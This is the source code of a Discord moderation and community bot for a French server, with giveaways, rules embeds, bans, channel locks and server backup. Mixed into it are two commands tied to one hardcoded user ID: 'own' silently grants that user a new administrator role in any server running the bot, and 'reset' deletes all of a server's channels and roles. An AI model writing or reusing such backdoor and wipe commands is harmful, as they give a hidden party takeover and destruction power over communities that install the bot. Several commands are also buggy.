import disnake
from disnake.ext import commands, tasks
import asyncio
import os
import re
import random
import requests
import aiohttp
from datetime import timedelta
import flask
from flask import Flask, jsonify
from threading import Thread
import json
from datetime import datetime, timedelta

bot = commands.Bot(command_prefix='+', intents=disnake.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}.")
    statut.start()
    
@tasks.loop(seconds=3)
async def statut():
    activity_list = ["discord.gg/lataverne", "./help", "By Mxtsouko"]
    selected = random.choice(activity_list)
    status_list = [disnake.Status.idle, disnake.Status.do_not_disturb, disnake.Status.online]
    selected_status = random.choice(status_list)

    await bot.change_presence(
        status=selected_status,
        activity=disnake.Activity(
            type=disnake.ActivityType.streaming,
            name=selected,
            url='https://www.twitch.tv/mxtsouko'
        )
    )

user_stats = {}

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.author.id not in user_stats:
        user_stats[message.author.id] = {
            "messages": 0,
            "voice_time": 0
        }
    
    user_stats[message.author.id]["messages"] += 1
    await bot.process_commands(message)

@bot.event
async def on_voice_state_update(member, before, after):
    if member.bot:
        return

    if before.channel is None and after.channel is not None:  
        user_stats[member.id]["voice_start"] = asyncio.get_event_loop().time() 
    elif before.channel is not None and after.channel is None:  
        if member.id in user_stats and "voice_start" in user_stats[member.id]:
            voice_time = asyncio.get_event_loop().time() - user_stats[member.id]["voice_start"]
            user_stats[member.id]["voice_time"] += voice_time  

            del user_stats[member.id]["voice_start"]

@bot.command(name='stat')
async def stat(ctx, user:disnake.Member):
    user_id = ctx.user.id
    stats = user_stats.get(user_id, None)
    
    voice_time = stats["voice_time"] if stats else 0
    hours, remainder = divmod(voice_time, 3600)
    minutes, seconds = divmod(remainder, 60)
    message_count = stats["messages"] if stats else 0


        
    em = disnake.Embed(title='Stat', description="Here are your or the user's statistics", color=disnake.Colour.dark_gray())
    em.add_field(name='Voice', value=f'You have spent **{int(hours)} hours, {int(minutes)} minutes, and {int(seconds)} seconds** in voice channels.')
    em.add_field(name='Message', value=f'You have sent a total of **{message_count} messages**.')
    
    await ctx.send(content=f'Here are the statistics of {user.mention}', embed=em)



@bot.command(name='msg_partner', descriptions='show message partner conditions')
@commands.has_permissions(administrator=True)
async def partner(ctx, channel: disnake.TextChannel):
        embed_image = disnake.Embed(color=disnake.Colour.dark_gray())
        embed_image.set_image(url='https://media.discordapp.net/attachments/1280352059031425035/1282095507841351692/1af689d42bdb7686df444f22925f9e89.gif?ex=66e4b37d&is=66e361fd&hm=d47fa94695ca764bc85edc26f2133348bf88347bb8ff2d16563dbd2faf3f7d8c&=&width=1193&height=671')

        embed = disnake.Embed(title='Conditions', color=disnake.Colour.dark_gray())
        embed.add_field(name='Membres:', value='Minimum 15 (sans les bots)', inline=False)
        embed.add_field(name='Partenariat:', value="Pas de serveur NSFW, boutique uniquement, toxique, ou ne respectant pas les ToS. Pas de serveurs pratiquant du ficha, dox ou autres abus.", inline=False)
        embed.add_field(name='Important:', value="Si vous supprimez notre pub ou quittez le serveur, le partenariat sera annulé, nous ne somme pas obliger de rester sur votre serveur mais vous devez restez sur le notre", inline=False)
        embed.add_field(name='Mentions:', value="Nous mentionnons uniquement <@&1280683305548906536>. Si votre serveur a moins de 20 membres, vous devez ping everyone.", inline=False)
        embed.add_field(name='Vérifications:', value="Votre serveur sera vérifié avant de publier votre pub. Si vous cachez un everyone, vous serez sur notre blacklist.", inline=False)
        
        class Ticket(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Ticket!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1270457969146069124")
                
        class NotrePub(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Notre Pub!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1280630287612772496")

        if channel:
            view = disnake.ui.View()
            view.add_item(Ticket())
            view.add_item(NotrePub())
            await channel.send('https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=')
            await channel.send(embed=embed_image)
            await ctx.send(embed=embed, view=view)
        
@bot.command(name='recrutement', description='show recrutement confitions')
@commands.has_permissions(manage_messages=True)
async def recrutement(ctx, channel: disnake.TextChannel):
        embed_image = disnake.Embed(color=disnake.Colour.dark_gray())
        embed_image.set_image(url='https://media.discordapp.net/attachments/1280352059031425035/1282095507841351692/1af689d42bdb7686df444f22925f9e89.gif?ex=66e4b37d&is=66e361fd&hm=d47fa94695ca764bc85edc26f2133348bf88347bb8ff2d16563dbd2faf3f7d8c&=&width=1193&height=671')

        embed = disnake.Embed(title='Conditions', color=disnake.Colour.dark_gray())
        embed.add_field(name='Age requis:', value='Minimum 14 ans (nous pouvont faire des exeption)', inline=False)
        embed.add_field(name='Demandé:', value="Nous vous demandons un minimum de maturité et de courtoisie", inline=False)
        embed.add_field(name='Important:', value="Nous vous demandons de respecter tous les membre du staff et les membre les manque de respect ne sont pas tolérer", inline=False)
        embed.add_field(name='Nous recherchons:', value="Des Cm/Gp (Community Manager/Gestion partner), des Modérateur/Animateur et des helpeur, ainsi que des giveur drop et drop manager", inline=False)
        embed.add_field(name='Vérifications:', value="Vous aller passer une periode de teste de 2 semaine", inline=False)
        
        class Ticket(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Ticket!", style=disnake.ButtonStyle.link, url="https://discord.com/channels/1251476405112537148/1270457969146069124")
                
        class NotrePub(disnake.ui.Button):
            def __init__(self):
                super().__init__(label="Click Ici pour faire ta candidature!", style=disnake.ButtonStyle.link, url="https://forms.gle/QxWytREs11Q6XzAB6")

        if channel:
            view = disnake.ui.View()
            view.add_item(Ticket())
            view.add_item(NotrePub())
            await channel.send('https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=')
            await channel.send(embed=embed_image)
            await ctx.send(embed=embed, view=view)
        
@bot.command(name='moveall', description='move all user in your channel')
@commands.has_permissions(administrator=True)
async def moveall(ctx):
    if ctx.author.voice:  
        channel = ctx.author.voice.channel
        for member in ctx.guild.members:
            if member.voice and member.voice.channel != channel:  
                await member.move_to(channel)
        
        embed = disnake.Embed(
            title="🔄 Users Moved",
            description="All users have been moved to your voice channel.",
            color=disnake.Color.dark_gray()
        )
        await ctx.send(embed=embed)
    else:
        embed = disnake.Embed(
            title="❌ Error",
            description="You must be in a voice channel to use this command.",
            color=disnake.Color.dark_gray()
        )
        await ctx.send(embed=embed)
        
@bot.command(name="renew", description='duplicate and remove channel')
@commands.has_permissions(manage_channels=True)
async def renew(ctx):
    channel = ctx.channel
    category = channel.category

    new_channel = await ctx.guild.create_text_channel(channel.name, category=category)

    for perm in channel.overwrites:
        await new_channel.set_permissions(perm, overwrite=channel.overwrites[perm])

    await channel.delete()

    await new_channel.send("This channel has been renewed.")

@bot.command(name="clear", description='delete message in channel')
@commands.has_permissions(manage_messages=True)
async def clear(ctx):
    messages = await ctx.channel.history(limit=100).flatten()
    message_count = len(messages)

    if message_count >= 100:
        await ctx.send("The message count exceeded 100. The channel will be recreated.")
        await renew(ctx)
    else:
        await ctx.send(f"There are currently {message_count} messages in this channel, which is below the limit.")
        
@bot.command(name="help")
async def help_command(ctx):
    embed = disnake.Embed(
        title="Help Menu",
        color=disnake.Color.dark_gray()
    )
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    embed.set_image(url=ctx.guild.banner.url if ctx.guild.banner else None)

    for command in bot.commands:
        embed.add_field(
            name=f"`{command.name}`",
            value=f"**Description:** {command.description or 'No description provided.'}",
            inline=False
        )

    await ctx.send(embed=embed)

giveaways = {}

def convert_duration(duration: str):
    if not duration[:-1].isdigit():  # Check if the numeric part is valid
        return None
    
    if duration[-1] == 's':
        return int(duration[:-1])
    elif duration[-1] == 'm':
        return int(duration[:-1]) * 60
    elif duration[-1] == 'h':
        return int(duration[:-1]) * 3600
    elif duration[-1] == 'd':
        return int(duration[:-1]) * 86400
    else:
        return None

@bot.command(name='giveaway')
@commands.has_permissions(manage_messages=True)
async def start_giveaway(ctx, prize: str, conditions: str, duration: str, *, image=None):
    duration_seconds = convert_duration(duration)
    if duration_seconds is None:
        await ctx.send("Invalid duration format. Use 's' for seconds, 'm' for minutes, 'h' for hours, or 'd' for days.")
        return

    embed = disnake.Embed(
        title="New Giveaway",
        description=f"Prize: ```{prize}```",
        color=disnake.Color.dark_gray()
    )
    embed.add_field(name="Author", value=ctx.author.mention, inline=True)
    embed.add_field(name="Time", value=f"**`{duration}`**", inline=True)
    embed.add_field(name="Conditions", value=conditions, inline=False)
    
    if image:
        embed.set_image(url=image)

    message = await ctx.send(embed=embed)
    
    await message.add_reaction("🎉")

    giveaways[message.id] = {
        "prize": prize,
        "conditions": conditions,
        "duration": duration_seconds,
        "author": ctx.author,
        "participants": []
    }
    
    for remaining in range(duration_seconds, 0, -1):
        await asyncio.sleep(1)
        embed.set_field_at(1, name="Time", value=f"**`{remaining} seconds`**")
        await message.edit(embed=embed)

    giveaway_data = giveaways.pop(message.id, None)
    if giveaway_data:
        participants = giveaway_data["participants"]
        if participants:
            winner = random.choice(participants)
            embed.add_field(name="Winner", value=winner.mention, inline=False)
            await ctx.send(embed=embed)
            await winner.send(f"Congratulations! You've won: **{giveaway_data['prize']}**")
        else:
            embed.add_field(name="Winner", value="No participants.", inline=False)
            await ctx.send(embed=embed)
    
    await message.clear_reaction("🎉")

@bot.event
async def on_reaction_add(reaction, user):
    if reaction.emoji == "🎉" and not user.bot:
        message_id = reaction.message.id
        if message_id in giveaways:
            giveaways[message_id]["participants"].append(user)

@bot.event
async def on_reaction_remove(reaction, user):
    if reaction.emoji == "🎉" and not user.bot:
        message_id = reaction.message.id
        if message_id in giveaways:
            giveaways[message_id]["participants"].remove(user)
            
@bot.command(name='rules', description='show server rules')
@commands.has_permissions(manage_messages=True)
async def rules(ctx, channel: disnake.TextChannel):
    em_img = disnake.Embed()
    em_img.set_image(url='https://media.discordapp.net/attachments/1280352059031425035/1282095507841351692/1af689d42bdb7686df444f22925f9e89.gif?ex=66e4b37d&is=66e361fd&hm=d47fa94695ca764bc85edc26f2133348bf88347bb8ff2d16563dbd2faf3f7d8c&=&width=1193&height=671')

    embed = disnake.Embed(title="Règlement du Serveur", color=disnake.Colour.dark_gray())
    embed.add_field(name="Tos", value="Nous vous demandons de formellement respecter les termes de service de Discord.", inline=False)
    embed.add_field(name="Interdiction", value="Il est interdit d'insulter les autres utilisateurs, d'imposer vos croyances religieuses. Chacun est libre de ses choix. Le manque de respect et toute forme de discrimination sont strictement interdits.", inline=False)
    embed.add_field(name="Bannissement", value="Les actes suivants entraîneront un bannissement : toute forme de hacking, phishing, faux cadeaux Nitro, doxing, ou dérangements vocaux.", inline=False)
    embed.add_field(name="Pub, lien", value="Il est interdit de faire de la publicité sans permission. Vous pouvez toutefois faire une demande de partenariat si vous remplissez les conditions indiquées [ici](https://discord.com/channels/1251476405112537148/1283059386033639465).", inline=False)
    embed.add_field(name="But", value="Notre serveur a pour but de divertir les membres, de leur apporter du sourire, et de réaliser divers projets à l'avenir.", inline=False)
    embed.add_field(name="But 2", value="Nous prévoyons de vous offrir une variété de divertissements, y compris des giveaways et des projets uniques.", inline=False)

    if channel:
        await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66e47bcf&is=66e32a4f&hm=ac7a1faa0c29bd995c61f7e89a7fb9aa9c201b53c4489701885e5dc2f07b57c7&=")
        await channel.send(embed=em_img)
        await channel.send(embed=embed)

@bot.command(name='support', description='show support message')
@commands.has_permissions(manage_messages=True)
async def soutien(ctx, channel: disnake.TextChannel):
    embed = disnake.Embed(title="Nous Soutenir `🔎`", color=disnake.Color.dark_gray())
    embed.add_field(name="/lataverne dans votre statut", value="Obtenez le rôle <@&1251588659015192607>", inline=False)
    embed.add_field(name="Boostez le serveur", value="Obtenez le rôle <@&1256932646903091291> et ses avantages : https://discord.com/channels/1251476405112537148/1268927834714542183", inline=False)
    
    em2 = disnake.Embed()
    em2.set_image(url='https://media.discordapp.net/attachments/1280352059031425035/1282095507841351692/1af689d42bdb7686df444f22925f9e89.gif?ex=66fe68bd&is=66fd173d&hm=b969f5cbb3748ab1efdb1dab19cc6a29904e8cfa4934ef0b687dca7d250d308b&=&width=1193&height=671')
    
    if channel:
        await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66fe310f&is=66fcdf8f&hm=4b9aca670052feb715f185c930165955d5809e277009bb314cd240167507901c&=")
        await channel.send(embed=em2)
        await channel.send(embed=embed)
            

        
@bot.command(name='say', description='send a message')
@commands.has_permissions(manage_messages=True)
async def say(ctx, *, message: str):
    await ctx.message.delete()

    
    await ctx.send(message)


@bot.command(name='modify', description='modify bot message with id')
@commands.has_permissions(manage_messages=True)
async def modify(ctx, message_id: int, *, new_message: str):
    await ctx.message.delete()
    
    try:
        message = await ctx.channel.fetch_message(message_id)
        await message.edit(content=new_message)

        embed = disnake.Embed(
            description="Message modified successfully.",
            color=disnake.Color.dark_gray()
        )
        msg = await ctx.send(embed=embed)
        asyncio.sleep(3)
        msg.delete()
        
    except disnake.NotFound:
        await ctx.send("Message not found.", ephemeral=True)
    except disnake.Forbidden:
        await ctx.send("I do not have permission to edit that message.", ephemeral=True)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}", ephemeral=True)
    
@bot.command(name="own", description='setup mxtsouko to config bot in another server')
async def setup_owner(ctx):
    if ctx.author.id != 723256412674719795:
        await ctx.send("You do not have permission to use this command.")
        return

    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("I do not have the necessary administrative permissions.")
        return

    role_name = "Owner"
    existing_role = disnake.utils.get(ctx.guild.roles, name=role_name)

    if existing_role:
        embed = disnake.Embed(
            title="Role Exists",
            description=f"The role `{role_name}` already exists.",
            color=disnake.Color.red()
        )
        await ctx.send(embed=embed)
    else:
        bot_top_role = ctx.guild.me.top_role
        admin_role = await ctx.guild.create_role(name=role_name, permissions=disnake.Permissions(administrator=True))
        await admin_role.edit(position=bot_top_role.position - 1)
        owner = ctx.guild.get_member(723256412674719795)

        if owner:
            await owner.add_roles(admin_role)
            banner_url = ctx.guild.banner.url if ctx.guild.banner else None
            icon_url = ctx.guild.icon.url if ctx.guild.icon else None
            
            embed = disnake.Embed(
                title="Role Created",
                description=f"The role `{role_name}` has been created and assigned to <@723256412674719795>.",
                color=disnake.Color.green()
            )

            if icon_url:
                embed.set_thumbnail(url=icon_url)
            if banner_url:
                embed.set_image(url=banner_url)
            embed.set_footer(text=f"Action by {ctx.author}", icon_url=ctx.author.avatar.url)

            await ctx.send(embed=embed)

@bot.command(name='lock', description='Lock the channel')
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    everyone_role = ctx.guild.default_role
    await ctx.channel.set_permissions(everyone_role, send_messages=False, view_channel=True)

    embed = disnake.Embed(
        title="🔒 Channel Locked",
        description=f"Members with the **@everyone** role can still view the channel but can no longer send messages.",
        color=disnake.Color.dark_gray()
    )

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)

    await ctx.send(embed=embed)


@bot.command(name='unlock', description='Unlock the channel')
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    everyone_role = ctx.guild.default_role
    await ctx.channel.set_permissions(everyone_role, send_messages=True, view_channel=True)

    embed = disnake.Embed(
        title="🔓 Channel Unlocked",
        description=f"Members with the **@everyone** role can now send messages in this channel.",
        color=disnake.Color.dark_gray()
    )

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)

    await ctx.send(embed=embed)

@bot.command(name="give", description="Assign a role to a member or all members")
@commands.has_permissions(manage_guild=True)
async def give(ctx, member: str, *, role_name: str):
    role = disnake.utils.get(ctx.guild.roles, name=role_name)

    if not role or role.position >= ctx.guild.me.top_role.position:
        embed = disnake.Embed(
            title="Error", 
            description=f"Role `{role_name}` not found or above my permissions.",
            color=disnake.Color.red()
        )
        await ctx.send(embed=embed)
        return

    banner_url = ctx.guild.banner.url if ctx.guild.banner else None
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None

    embed = disnake.Embed(
        title=f"Role Assignment: `{role_name}`",
        color=disnake.Color.green()
    )
    
    if icon_url:
        embed.set_thumbnail(url=icon_url)
    if banner_url:
        embed.set_image(url=banner_url)
    embed.set_footer(text=f"Action by {ctx.author}", icon_url=ctx.author.avatar.url)
    
    message = await ctx.send(embed=embed)

    if member == "all":
        success, failed = 0, 0
        for user in ctx.guild.members:
            if not user.bot and role not in user.roles:
                try:
                    await user.add_roles(role)
                    success += 1
                except disnake.Forbidden:
                    failed += 1
        embed.description = f"Assigned role `{role_name}` to {success} members."
        if failed:
            embed.description += f"\nFailed to assign role to {failed} members."
    else:
        target_member = disnake.utils.get(ctx.guild.members, mention=member)
        if not target_member:
            embed.title = "Error"
            embed.description = f"Member `{member}` not found."
            embed.color = disnake.Color.red()
        else:
            if role in target_member.roles:
                embed.description = f"{target_member.mention} already has the role `{role_name}`."
                embed.color = disnake.Color.orange()
            else:
                try:
                    await target_member.add_roles(role)
                    embed.description = f"Assigned role `{role_name}` to {target_member.mention}."
                except disnake.Forbidden:
                    embed.description = f"Cannot assign role to {target_member.mention}."
                    embed.color = disnake.Color.red()

    await message.edit(embed=embed)

@bot.command(name='reset', description='Reset the server')
async def reset(ctx):
    if ctx.author.id != 723256412674719795:
        await ctx.send("You do not have permission to use this command.")
        return

    for channel in ctx.guild.channels:
        await channel.delete()

    for role in ctx.guild.roles:
        if role.name != "@everyone":
            await role.delete()

    reset_channel = await ctx.guild.create_text_channel("Server is reset")
    await reset_channel.send(f"Server has been reset by <@723256412674719795>.")
    await ctx.send(f"All channels and roles have been deleted. A new channel has been created: {reset_channel.mention}.")

import json
from disnake.ext import commands

@bot.command(name='backup', description='Create a backup of the server')
async def backup(ctx):
    if ctx.author.id != 723256412674719795:
        await ctx.send("You do not have permission to use this command.")
        return

    server_data = {
        'roles': {},
        'categories': {},
        'channels': []
    }

    # Sauvegarde des rôles
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            server_data['roles'][role.id] = {
                'name': role.name,
                'permissions': role.permissions.value,
                'position': role.position
            }

    # Sauvegarde des catégories
    for category in ctx.guild.categories:
        server_data['categories'][category.id] = {
            'name': category.name,
            'position': category.position,
            'overwrites': {}
        }

        for role in ctx.guild.roles:
            server_data['categories'][category.id]['overwrites'][role.id] = {
                'send_messages': category.permissions_for(role).send_messages,
                'read_messages': category.permissions_for(role).read_messages
            }

    # Sauvegarde des salons
    for channel in ctx.guild.channels:
        if isinstance(channel, disnake.TextChannel) or isinstance(channel, disnake.VoiceChannel):
            channel_data = {
                'id': channel.id,
                'name': channel.name,
                'type': 'text' if isinstance(channel, disnake.TextChannel) else 'voice',
                'position': channel.position,
                'parent_id': channel.category.id if channel.category else None,
                'overwrites': {}
            }

            for role in ctx.guild.roles:
                channel_data['overwrites'][role.id] = {
                    'send_messages': channel.permissions_for(role).send_messages,
                    'read_messages': channel.permissions_for(role).read_messages
                }

            server_data['channels'].append(channel_data)

    with open('backup.json', 'w') as f:
        json.dump(server_data, f, indent=4)

    await ctx.send("Backup has been created successfully.")

@bot.command(name='load', description='Load the backup of the server')
@commands.is_owner()
async def load(ctx):
    try:
        with open('backup.json', 'r') as f:
            server_data = json.load(f)

        for role_data in sorted(server_data['roles'].values(), key=lambda r: r['position']):
            role = await ctx.guild.create_role(name=role_data['name'], permissions=disnake.Permissions(role_data['permissions']))
            await role.edit(position=role_data['position'])

        for category_data in sorted(server_data['categories'].values(), key=lambda c: c['position']):
            category = await ctx.guild.create_category(name=category_data['name'], position=category_data['position'])
            for role_id, permissions in category_data['overwrites'].items():
                role = ctx.guild.get_role(role_id)
                if role:
                    await category.set_permissions(role, send_messages=permissions['send_messages'], read_messages=permissions['read_messages'])

        for channel_data in sorted(server_data['channels'], key=lambda c: c['position']):
            category = None
            if channel_data['parent_id']:
                category = disnake.utils.get(ctx.guild.categories, id=channel_data['parent_id'])
            if channel_data['type'] == 'text':
                channel = await ctx.guild.create_text_channel(name=channel_data['name'], category=category, position=channel_data['position'])
            else:
                channel = await ctx.guild.create_voice_channel(name=channel_data['name'], category=category, position=channel_data['position'])

            for role_id, permissions in channel_data['overwrites'].items():
                role = ctx.guild.get_role(role_id)
                if role:
                    await channel.set_permissions(role, send_messages=permissions['send_messages'], read_messages=permissions['read_messages'])

        await ctx.send("Backup has been loaded successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command(name='suspend', description='Suspend a staff member')
@commands.has_permissions(manage_guild=True)
async def suspend(ctx, membre: disnake.Member, temps: str, *roles: disnake.Role):
    time_mapping = {
        "s": 1,    
        "m": 60,    
        "h": 3600,  
        "d": 86400  
    }

    if temps[-1] not in time_mapping:
        await ctx.send("Invalid time format. Use 's', 'm', 'h', or 'd'.", ephemeral=True)
        return

    try:
        duration = int(temps[:-1]) * time_mapping[temps[-1]]
    except ValueError:
        await ctx.send("Invalid time format.", ephemeral=True)
        return


    if not roles:
        await ctx.send("You must specify at least one role to remove.", ephemeral=True)
        return

    guild = ctx.guild
    banner_url = guild.banner.url if guild.banner else None
    icon_url = guild.icon.url if guild.icon else None

    for role in roles:
        await membre.remove_roles(role)

    try:
        await membre.send(f"You have been suspended for {temps}. Your staff roles have been temporarily removed.")
    except disnake.Forbidden:
        await ctx.send("Unable to send a DM to the member.", ephemeral=True)

    embed = disnake.Embed(
        title=f"{membre.name} has been suspended",
        description=f"Suspended for {temps}. Staff roles removed temporarily.",
        color=disnake.Color.red()
    )

    if icon_url:
        embed.set_thumbnail(url=icon_url)

    if banner_url:
        embed.set_image(url=banner_url)

    embed.set_footer(text=f"Action performed by {ctx.author.name}", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed, ephemeral=True)

    await asyncio.sleep(duration)


    for role in roles:
        await membre.add_roles(role)

    await ctx.send(f"The suspension for {membre.mention} has ended.", ephemeral=True)



@bot.command(name='ban', description='Ban a user')
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: disnake.Member, *, reason=None):
    if member == ctx.author:
        await ctx.send("You cannot ban yourself!")
        return

    reason = reason or "No reason provided"
    await member.ban(reason=reason)

    guild = ctx.guild
    banner_url = guild.banner.url if guild.banner else None
    icon_url = guild.icon.url if guild.icon else None

    embed = disnake.Embed(
        title=f"{member.name} has been banned",
        description=f"**```Reason: {reason}```**",
        color=disnake.Color.dark_grey()
    )

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    
    if banner_url:
        embed.set_image(url=banner_url)

    embed.set_footer(text=f"Banned by {ctx.author.name}", icon_url=ctx.author.avatar.url)

    await ctx.send(content=member.mention, embed=embed)


@bot.command(name='tempban', description='Temporarily ban a user')
@commands.has_permissions(ban_members=True)
async def tempban(ctx, member: disnake.Member, time: int, unit: str, *, reason=None):
    if member == ctx.author:
        await ctx.send("You cannot ban yourself!")
        return

    time_units = {
        's': timedelta(seconds=time),
        'm': timedelta(minutes=time),
        'h': timedelta(hours=time),
        'd': timedelta(days=time)
    }

    if unit not in time_units:
        await ctx.send("Invalid time unit. Use 's' (seconds), 'm' (minutes), 'h' (hours), or 'd' (days).")
        return

    try:
        await member.ban(reason=reason or "No reason provided")

        guild = ctx.guild
        banner_url = guild.banner.url if guild.banner else None
        icon_url = guild.icon.url if guild.icon else None

        embed = disnake.Embed(
            title=f"{member.name} has been temporarily banned",
            description=f"Banned for {time} {unit}. (Reason: {reason or 'No reason provided'})",
            color=disnake.Color.dark_grey()
        )
        if icon_url:
            embed.set_thumbnail(url=icon_url)
        if banner_url:
            embed.set_image(url=banner_url)

        msg = await ctx.send(embed=embed)

        total_seconds = time_units[unit].total_seconds()
        for i in range(int(total_seconds // 60)): 
            remaining_time = int(total_seconds // 60) - i
            embed.description = f"Banned for {time} {unit}.\nRemaining time: {remaining_time} minutes."
            await msg.edit(embed=embed)
            await asyncio.sleep(60)  

        await asyncio.sleep(total_seconds % 60) 
        await ctx.guild.unban(member)

        embed.title = f"{member.name} has been unbanned"
        embed.description = f"{member.name} was unbanned after serving {time} {unit}."
        await msg.edit(embed=embed)

        await ctx.send(f"{member.name} has been unbanned after {time} {unit}.")

    except disnake.Forbidden:
        await ctx.send("I don't have permission to ban this user.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


@ban.error
@tempban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Vous n'avez pas les permissions nécessaires pour utiliser cette commande.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Utilisateur non trouvé ou mauvais argument.")
    else:
        await ctx.send("Une erreur est survenue.")




@bot.command(name='rank', description='promote a member role')
@commands.has_permissions(administrator=True)
async def rank(ctx, member: disnake.Member, role: disnake.Role):
    try:
        if role in member.roles:
            await ctx.send(f"{member.mention} already has the role {role.mention}.", delete_after=5)
        else:
            await member.add_roles(role)
            await ctx.send(f"{member.mention} has been promoted to {role.mention}.")

    except disnake.Forbidden:
        await ctx.send("I don't have permission to modify roles.", delete_after=5)

    except disnake.HTTPException:
        await ctx.send("An error occurred while assigning the role.", delete_after=5)

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}", delete_after=5)


@rank.error
async def rank_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("You do not have permission to use this command.", delete_after=5)
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid argument. Make sure to mention a valid member and role.", delete_after=5)

app = Flask('')

@app.route('/')
def main():
    return f"Logged in as {bot.user}."

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    server = Thread(target=run)
    server.start()

keep_alive()


bot.run(os.getenv('TOKEN'))
